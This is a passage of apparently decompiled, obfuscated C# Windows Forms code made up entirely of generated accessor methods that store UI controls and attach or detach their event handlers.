        return this.trackBar_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_105(TrackBar trackBar_2)
    {
        EventHandler handler = new EventHandler(this.method_18);
        TrackBar bar = this.trackBar_1;
        if (bar != null)
        {
            bar.Scroll -= handler;
        }
        this.trackBar_1 = trackBar_2;
        bar = this.trackBar_1;
        if (bar != null)
        {
            bar.Scroll += handler;
        }
    }

    internal virtual Label vmethod_106()
    {
        return this.label_22;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_107(Label label_40)
    {
        this.label_22 = label_40;
    }

    internal virtual Label vmethod_108()
    {
        return this.label_23;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_109(Label label_40)
    {
        this.label_23 = label_40;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_11(Label label_40)
    {
        this.label_0 = label_40;
    }

    internal virtual CheckBox vmethod_110()
    {
        return this.checkBox_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_111(CheckBox checkBox_18)
    {
        this.checkBox_3 = checkBox_18;
    }

    internal virtual PictureBox vmethod_112()
    {
        return this.pictureBox_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_113(PictureBox pictureBox_16)
    {
        EventHandler handler = new EventHandler(this.method_23);
        PictureBox box = this.pictureBox_3;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_3 = pictureBox_16;
        box = this.pictureBox_3;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual CheckBox vmethod_114()
    {
        return this.checkBox_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_115(CheckBox checkBox_18)
    {
        EventHandler handler = new EventHandler(this.method_24);
        CheckBox box = this.checkBox_4;
        if (box != null)
        {
            box.CheckedChanged -= handler;
        }
        this.checkBox_4 = checkBox_18;
        box = this.checkBox_4;
        if (box != null)
        {
            box.CheckedChanged += handler;
        }
    }

    internal virtual PictureBox vmethod_116()
    {
        return this.pictureBox_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_117(PictureBox pictureBox_16)
    {
        EventHandler handler = new EventHandler(this.method_25);
        PictureBox box = this.pictureBox_4;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_4 = pictureBox_16;
        box = this.pictureBox_4;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual Label vmethod_118()
    {
        return this.label_24;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_119(Label label_40)
    {
        this.label_24 = label_40;
    }

    internal virtual Label vmethod_12()
    {
        return this.label_1;
    }

    internal virtual TextBox vmethod_120()
    {
        return this.textBox_11;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_121(TextBox textBox_20)
    {
        EventHandler handler = new EventHandler(this.method_27);
        TextBox box = this.textBox_11;
        if (box != null)
        {
            box.TextChanged -= handler;
        }
        this.textBox_11 = textBox_20;
        box = this.textBox_11;
        if (box != null)
        {
            box.TextChanged += handler;
        }
    }

    internal virtual PictureBox vmethod_122()
    {
        return this.pictureBox_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_123(PictureBox pictureBox_16)
    {
        EventHandler handler = new EventHandler(this.method_26);
        PictureBox box = this.pictureBox_5;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_5 = pictureBox_16;
        box = this.pictureBox_5;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual Label vmethod_124()
    {
        return this.label_25;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_125(Label label_40)
    {
        this.label_25 = label_40;
    }

    internal virtual TextBox vmethod_126()
    {
        return this.textBox_12;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_127(TextBox textBox_20)
    {
        EventHandler handler = new EventHandler(this.method_28);
        EventHandler handler2 = new EventHandler(this.method_29);
        EventHandler handler3 = new EventHandler(this.method_30);
        TextBox box = this.textBox_12;
        if (box != null)
        {
            box.TextChanged -= handler;
            box.GotFocus -= handler2;
            box.LostFocus -= handler3;
        }
        this.textBox_12 = textBox_20;
        box = this.textBox_12;
        if (box != null)
        {
            box.TextChanged += handler;
            box.GotFocus += handler2;
            box.LostFocus += handler3;
        }
    }

    internal virtual Label vmethod_128()
    {
        return this.label_26;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_129(Label label_40)
    {
        this.label_26 = label_40;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_13(Label label_40)
    {
        this.label_1 = label_40;
    }

    internal virtual TextBox vmethod_130()
    {
        return this.textBox_13;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_131(TextBox textBox_20)
    {
        EventHandler handler = new EventHandler(this.method_31);
        EventHandler handler2 = new EventHandler(this.method_32);
        EventHandler handler3 = new EventHandler(this.method_33);
        TextBox box = this.textBox_13;
        if (box != null)
        {
            box.TextChanged -= handler;
            box.GotFocus -= handler2;
            box.LostFocus -= handler3;
        }
        this.textBox_13 = textBox_20;
        box = this.textBox_13;
        if (box != null)
        {
            box.TextChanged += handler;
            box.GotFocus += handler2;
            box.LostFocus += handler3;
        }
    }

    internal virtual Label vmethod_132()
    {
        return this.label_27;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_133(Label label_40)
    {
        this.label_27 = label_40;
    }

    internal virtual TextBox vmethod_134()
    {
        return this.textBox_14;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_135(TextBox textBox_20)
    {
        EventHandler handler = new EventHandler(this.method_35);
        TextBox box = this.textBox_14;
        if (box != null)
        {
            box.TextChanged -= handler;
        }
        this.textBox_14 = textBox_20;
        box = this.textBox_14;
        if (box != null)
        {
            box.TextChanged += handler;
        }
    }

    internal virtual Label vmethod_136()
    {
        return this.label_28;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_137(Label label_40)
    {
        this.label_28 = label_40;
    }

    internal virtual CheckBox vmethod_138()
    {
        return this.checkBox_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_139(CheckBox checkBox_18)
    {
        this.checkBox_5 = checkBox_18;
    }

    internal virtual TextBox vmethod_14()
    {
        return this.textBox_0;
    }

    internal virtual TextBox vmethod_140()
    {
        return this.textBox_15;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_141(TextBox textBox_20)
    {
        EventHandler handler = new EventHandler(this.method_36);
        TextBox box = this.textBox_15;
        if (box != null)
        {
            box.TextChanged -= handler;
        }
        this.textBox_15 = textBox_20;
        box = this.textBox_15;
        if (box != null)
        {
            box.TextChanged += handler;
        }
    }

    internal virtual Label vmethod_142()
    {
        return this.label_29;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_143(Label label_40)
    {
        this.label_29 = label_40;
    }

    internal virtual PictureBox vmethod_144()
    {
        return this.pictureBox_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_145(PictureBox pictureBox_16)
    {
        EventHandler handler = new EventHandler(this.method_37);
        PictureBox box = this.pictureBox_6;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_6 = pictureBox_16;
        box = this.pictureBox_6;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual PictureBox vmethod_146()
    {
        return this.pictureBox_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_147(PictureBox pictureBox_16)
    {
        EventHandler handler = new EventHandler(this.method_38);
        PictureBox box = this.pictureBox_7;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_7 = pictureBox_16;
        box = this.pictureBox_7;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual Label vmethod_148()
    {
        return this.label_30;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_149(Label label_40)
    {
        this.label_30 = label_40;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_15(TextBox textBox_20)
    {
        this.textBox_0 = textBox_20;
    }

    internal virtual TextBox vmethod_150()
    {
        return this.textBox_16;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_151(TextBox textBox_20)
    {
        EventHandler handler = new EventHandler(this.method_40);
        TextBox box = this.textBox_16;
        if (box != null)
        {
            box.TextChanged -= handler;
        }
        this.textBox_16 = textBox_20;
        box = this.textBox_16;
        if (box != null)
        {
            box.TextChanged += handler;
        }
    }

    internal virtual Label vmethod_152()
    {
        return this.label_31;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_153(Label label_40)
    {
        this.label_31 = label_40;
    }

    internal virtual Label vmethod_154()
    {
        return this.label_32;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_155(Label label_40)
    {
        this.label_32 = label_40;
    }

    internal virtual TextBox vmethod_156()
    {
        return this.textBox_17;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_157(TextBox textBox_20)
    {
        EventHandler handler = new EventHandler(this.method_41);
        TextBox box = this.textBox_17;
        if (box != null)
        {
            box.TextChanged -= handler;
        }
        this.textBox_17 = textBox_20;
        box = this.textBox_17;
        if (box != null)
        {
            box.TextChanged += handler;
        }
    }

    internal virtual Label vmethod_158()
    {
        return this.label_33;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_159(Label label_40)
    {
        this.label_33 = label_40;
    }

    internal virtual CheckBox vmethod_16()
    {
        return this.checkBox_0;
    }

    internal virtual PictureBox vmethod_160()
    {
        return this.pictureBox_8;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_161(PictureBox pictureBox_16)
    {
        EventHandler handler = new EventHandler(this.method_42);
        PictureBox box = this.pictureBox_8;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_8 = pictureBox_16;
        box = this.pictureBox_8;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual CheckBox vmethod_162()
    {
        return this.checkBox_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_163(CheckBox checkBox_18)
    {
        EventHandler handler = new EventHandler(this.method_44);
        CheckBox box = this.checkBox_6;
        if (box != null)
        {
            box.CheckedChanged -= handler;
        }
        this.checkBox_6 = checkBox_18;
        box = this.checkBox_6;
        if (box != null)
        {
            box.CheckedChanged += handler;
        }
    }

    internal virtual PictureBox vmethod_164()
    {
        return this.pictureBox_9;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_165(PictureBox pictureBox_16)
    {
        EventHandler handler = new EventHandler(this.method_43);
        PictureBox box = this.pictureBox_9;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_9 = pictureBox_16;
        box = this.pictureBox_9;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual RadioButton vmethod_166()
    {
        return this.radioButton_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_167(RadioButton radioButton_4)
    {
        this.radioButton_2 = radioButton_4;
    }

    internal virtual RadioButton vmethod_168()
    {
        return this.radioButton_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_169(RadioButton radioButton_4)
    {
        this.radioButton_3 = radioButton_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_17(CheckBox checkBox_18)
    {
        EventHandler handler = new EventHandler(this.method_57);
        CheckBox box = this.checkBox_0;
        if (box != null)
        {
            box.CheckedChanged -= handler;
        }
        this.checkBox_0 = checkBox_18;
        box = this.checkBox_0;
        if (box != null)
        {
            box.CheckedChanged += handler;
        }
    }

    internal virtual VisualButton vmethod_170()
    {
        return this.visualButton_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_171(VisualButton visualButton_12)
    {
        EventHandler handler = new EventHandler(this.method_46);
        VisualButton button = this.visualButton_0;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_0 = visualButton_12;
        button = this.visualButton_0;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual VisualButton vmethod_172()
    {
        return this.visualButton_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_173(VisualButton visualButton_12)
    {
        EventHandler handler = new EventHandler(this.method_47);
        VisualButton button = this.visualButton_1;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_1 = visualButton_12;
        button = this.visualButton_1;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual Timer vmethod_174()
    {
        return this.timer_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_175(Timer timer_2)
    {
        EventHandler handler = new EventHandler(this.method_48);
        Timer timer = this.timer_0;
        if (timer != null)
        {
            timer.Tick -= handler;
        }
        this.timer_0 = timer_2;
        timer = this.timer_0;
        if (timer != null)
        {
            timer.Tick += handler;
        }
    }

    internal virtual VisualButton vmethod_176()
    {
        return this.visualButton_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_177(VisualButton visualButton_12)
    {
        EventHandler handler = new EventHandler(this.method_50);
        VisualButton button = this.visualButton_2;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_2 = visualButton_12;
        button = this.visualButton_2;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual VisualButton vmethod_178()
    {
        return this.visualButton_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_179(VisualButton visualButton_12)
    {
        EventHandler handler = new EventHandler(this.method_53);
        VisualButton button = this.visualButton_3;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_3 = visualButton_12;
        button = this.visualButton_3;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual TextBox vmethod_18()
    {
        return this.textBox_1;
    }

    internal virtual VisualButton vmethod_180()
    {
        return this.visualButton_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_181(VisualButton visualButton_12)
    {
        EventHandler handler = new EventHandler(this.method_54);
        VisualButton button = this.visualButton_4;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_4 = visualButton_12;
        button = this.visualButton_4;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual VisualButton vmethod_182()
    {
        return this.visualButton_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_183(VisualButton visualButton_12)
    {
        EventHandler handler = new EventHandler(this.method_55);
        VisualButton button = this.visualButton_5;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_5 = visualButton_12;
        button = this.visualButton_5;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual VisualButton vmethod_184()
    {
        return this.visualButton_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_185(VisualButton visualButton_12)
    {
        EventHandler handler = new EventHandler(this.method_56);
        VisualButton button = this.visualButton_6;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_6 = visualButton_12;
        button = this.visualButton_6;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual TabPage vmethod_186()
    {
        return this.tabPage_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_187(TabPage tabPage_7)
    {
        this.tabPage_4 = tabPage_7;
    }

    internal virtual CheckBox vmethod_188()
    {
        return this.checkBox_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_189(CheckBox checkBox_18)
    {
        this.checkBox_7 = checkBox_18;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_19(TextBox textBox_20)
    {
        EventHandler handler = new EventHandler(this.method_6);
        TextBox box = this.textBox_1;
        if (box != null)
        {
            box.TextChanged -= handler;
        }
        this.textBox_1 = textBox_20;
        box = this.textBox_1;
        if (box != null)
        {
            box.TextChanged += handler;
        }
    }

    internal virtual CheckBox vmethod_190()
    {
        return this.checkBox_8;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_191(CheckBox checkBox_18)
    {
        this.checkBox_8 = checkBox_18;
    }

    internal virtual VisualButton vmethod_192()
    {
        return this.visualButton_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_193(VisualButton visualButton_12)
    {
        EventHandler handler = new EventHandler(this.method_58);
        VisualButton button = this.visualButton_7;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_7 = visualButton_12;
        button = this.visualButton_7;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual PictureBox vmethod_194()
    {
        return this.pictureBox_10;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_195(PictureBox pictureBox_16)
    {
        EventHandler handler = new EventHandler(this.method_59);
        PictureBox box = this.pictureBox_10;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_10 = pictureBox_16;
        box = this.pictureBox_10;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual Label vmethod_196()
    {
        return this.label_34;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_197(Label label_40)
    {
        this.label_34 = label_40;
    }

    internal virtual Label vmethod_198()
    {
        return this.label_35;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_199(Label label_40)
    {
        this.label_35 = label_40;
    }

    internal virtual Button vmethod_2()
    {
        return this.button_1;
    }

    internal virtual Label vmethod_20()
    {
        return this.label_2;
    }

    internal virtual CheckBox vmethod_200()
    {
        return this.checkBox_9;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_201(CheckBox checkBox_18)
    {
        this.checkBox_9 = checkBox_18;
    }

    internal virtual TabPage vmethod_202()
    {
        return this.tabPage_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_203(TabPage tabPage_7)
    {
        this.tabPage_5 = tabPage_7;
    }

    internal virtual Label vmethod_204()
    {
        return this.label_36;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_205(Label label_40)
    {
        this.label_36 = label_40;
    }

    internal virtual CheckBox vmethod_206()
    {
        return this.checkBox_10;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_207(CheckBox checkBox_18)
    {
        this.checkBox_10 = checkBox_18;
    }

    internal virtual VisualButton vmethod_208()
    {
        return this.visualButton_8;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_209(VisualButton visualButton_12)
    {
        EventHandler handler = new EventHandler(this.method_64);
        VisualButton button = this.visualButton_8;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_8 = visualButton_12;
        button = this.visualButton_8;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_21(Label label_40)
    {
        this.label_2 = label_40;
    }

    internal virtual CheckBox vmethod_210()
    {
        return this.checkBox_11;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_211(CheckBox checkBox_18)
    {
        this.checkBox_11 = checkBox_18;
    }

    internal virtual CheckBox vmethod_212()
    {
        return this.checkBox_12;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_213(CheckBox checkBox_18)
    {
        this.checkBox_12 = checkBox_18;
    }

    internal virtual PictureBox vmethod_214()
    {
        return this.pictureBox_11;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_215(PictureBox pictureBox_16)
    {
        EventHandler handler = new EventHandler(this.method_60);
        PictureBox box = this.pictureBox_11;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_11 = pictureBox_16;
        box = this.pictureBox_11;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual CheckBox vmethod_216()
    {
        return this.checkBox_13;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_217(CheckBox checkBox_18)
    {
        this.checkBox_13 = checkBox_18;
    }

    internal virtual CheckBox vmethod_218()
    {
        return this.checkBox_14;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_219(CheckBox checkBox_18)
    {
        this.checkBox_14 = checkBox_18;
    }

    internal virtual TextBox vmethod_22()
    {
        return this.textBox_2;
    }

    internal virtual PictureBox vmethod_220()
    {
        return this.pictureBox_12;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_221(PictureBox pictureBox_16)
    {
        EventHandler handler = new EventHandler(this.method_61);
        PictureBox box = this.pictureBox_12;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_12 = pictureBox_16;
        box = this.pictureBox_12;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual TextBox vmethod_222()
    {
        return this.textBox_18;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_223(TextBox textBox_20)
    {
        EventHandler handler = new EventHandler(this.method_62);
        TextBox box = this.textBox_18;
        if (box != null)
        {
            box.TextChanged -= handler;
        }
        this.textBox_18 = textBox_20;
        box = this.textBox_18;
        if (box != null)
        {
            box.TextChanged += handler;
        }
    }

    internal virtual Label vmethod_224()
    {
        return this.label_37;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_225(Label label_40)
    {
        this.label_37 = label_40;
    }

    internal virtual Timer vmethod_226()
    {
        return this.timer_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_227(Timer timer_2)
    {
        EventHandler handler = new EventHandler(this.method_63);
        Timer timer = this.timer_1;
        if (timer != null)
        {
            timer.Tick -= handler;
        }
        this.timer_1 = timer_2;
        timer = this.timer_1;
        if (timer != null)
        {
            timer.Tick += handler;
        }
    }

    internal virtual PictureBox vmethod_228()
    {
        return this.pictureBox_13;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_229(PictureBox pictureBox_16)
    {
        EventHandler handler = new EventHandler(this.method_65);
        PictureBox box = this.pictureBox_13;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_13 = pictureBox_16;
        box = this.pictureBox_13;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_23(TextBox textBox_20)
    {
        EventHandler handler = new EventHandler(this.method_34);
        TextBox box = this.textBox_2;
        if (box != null)
        {
            box.TextChanged -= handler;
        }
        this.textBox_2 = textBox_20;
        box = this.textBox_2;
        if (box != null)
        {
            box.TextChanged += handler;
        }
    }

    internal virtual PictureBox vmethod_230()
    {
        return this.pictureBox_14;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_231(PictureBox pictureBox_16)
    {
        EventHandler handler = new EventHandler(this.method_66);
        PictureBox box = this.pictureBox_14;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_14 = pictureBox_16;
        box = this.pictureBox_14;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual TabPage vmethod_232()
    {
        return this.tabPage_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_233(TabPage tabPage_7)
    {
        this.tabPage_6 = tabPage_7;
    }

    internal virtual VisualButton vmethod_234()
    {
        return this.visualButton_9;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_235(VisualButton visualButton_12)
    {
        EventHandler handler = new EventHandler(this.method_68);
        VisualButton button = this.visualButton_9;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_9 = visualButton_12;
        button = this.visualButton_9;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual VisualButton vmethod_236()
    {
        return this.visualButton_10;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_237(VisualButton visualButton_12)
    {
        EventHandler handler = new EventHandler(this.method_69);
        VisualButton button = this.visualButton_10;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_10 = visualButton_12;
        button = this.visualButton_10;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual TextBox vmethod_238()
    {
        return this.textBox_19;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_239(TextBox textBox_20)
    {
        this.textBox_19 = textBox_20;
    }

    internal virtual Label vmethod_24()
    {
        return this.label_3;
    }

    internal virtual Label vmethod_240()
    {
        return this.label_38;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_241(Label label_40)
    {
        this.label_38 = label_40;
    }

    internal virtual PictureBox vmethod_242()
    {
        return this.pictureBox_15;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_243(PictureBox pictureBox_16)
    {
        EventHandler handler = new EventHandler(this.method_67);
        PictureBox box = this.pictureBox_15;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_15 = pictureBox_16;
        box = this.pictureBox_15;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual FastObjectListView vmethod_244()
    {
        return this.fastObjectListView_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_245(FastObjectListView fastObjectListView_1)
    {
        this.fastObjectListView_0 = fastObjectListView_1;
    }

    internal virtual OLVColumn vmethod_246()
    {
        return this.olvcolumn_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_247(OLVColumn olvcolumn_2)
    {
        this.olvcolumn_0 = olvcolumn_2;
    }

    internal virtual OLVColumn vmethod_248()
    {
        return this.olvcolumn_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_249(OLVColumn olvcolumn_2)
    {
        this.olvcolumn_1 = olvcolumn_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_25(Label label_40)
    {
        this.label_3 = label_40;
    }

    internal virtual BackgroundWorker vmethod_250()
    {
        return this.backgroundWorker_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_251(BackgroundWorker backgroundWorker_1)
    {
        DoWorkEventHandler handler = new DoWorkEventHandler(this.method_73);
        BackgroundWorker worker = this.backgroundWorker_0;
        if (worker != null)
        {
            worker.DoWork -= handler;
        }
        this.backgroundWorker_0 = backgroundWorker_1;
        worker = this.backgroundWorker_0;
        if (worker != null)
        {
            worker.DoWork += handler;
        }
    }

    internal virtual ContextMenuStrip vmethod_252()
    {
        return this.contextMenuStrip_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_253(ContextMenuStrip contextMenuStrip_1)
    {
        this.contextMenuStrip_0 = contextMenuStrip_1;
    }

    internal virtual ToolStripMenuItem vmethod_254()
    {
        return this.toolStripMenuItem_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_255(ToolStripMenuItem toolStripMenuItem_1)
    {
        EventHandler handler = new EventHandler(this.method_74);
        ToolStripMenuItem item = this.toolStripMenuItem_0;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_0 = toolStripMenuItem_1;
        item = this.toolStripMenuItem_0;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual VisualButton vmethod_256()
    {
        return this.visualButton_11;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_257(VisualButton visualButton_12)
    {
        EventHandler handler = new EventHandler(this.method_75);
        VisualButton button = this.visualButton_11;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_11 = visualButton_12;
        button = this.visualButton_11;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual CheckBox vmethod_258()
    {
        return this.checkBox_15;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_259(CheckBox checkBox_18)
    {
        this.checkBox_15 = checkBox_18;
    }

    internal virtual TabPage vmethod_26()
    {
        return this.tabPage_1;
    }

    internal virtual Label vmethod_260()
    {
        return this.label_39;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_261(Label label_40)
    {
        this.label_39 = label_40;
    }

    internal virtual CheckBox vmethod_262()
    {
        return this.checkBox_16;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_263(CheckBox checkBox_18)
    {
        this.checkBox_16 = checkBox_18;
    }

    internal virtual CheckBox vmethod_264()
    {
        return this.checkBox_17;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_265(CheckBox checkBox_18)
    {
        this.checkBox_17 = checkBox_18;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_27(TabPage tabPage_7)
    {
        this.tabPage_1 = tabPage_7;
    }

    internal virtual TextBox vmethod_28()
    {
        return this.textBox_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_29(TextBox textBox_20)
    {
        EventHandler handler = new EventHandler(this.method_4);
        TextBox box = this.textBox_3;
        if (box != null)
        {
            box.TextChanged -= handler;
        }
        this.textBox_3 = textBox_20;
        box = this.textBox_3;
        if (box != null)
        {
            box.TextChanged += handler;
        }
    }

